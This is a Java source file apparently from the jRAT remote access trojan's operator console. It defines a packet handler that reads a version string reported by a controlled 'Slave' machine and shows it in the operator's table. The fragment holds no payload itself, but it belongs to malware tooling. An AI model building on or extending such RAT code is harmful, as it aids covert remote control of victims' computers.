package io.jrat.client.packets.incoming;

import io.jrat.client.Slave;
import io.jrat.client.ui.frames.Frame;
import io.jrat.client.utils.Utils;

import java.io.DataInputStream;


public class Packet30InitVersion extends AbstractIncomingPacket {

	public void read(Slave slave, DataInputStream dis) throws Exception {
		String version = slave.readLine();
		slave.setVersion(version);

		int row = Utils.getRow(slave);

		Frame.mainModel.setValueAt(version, row, 9);
	}

}
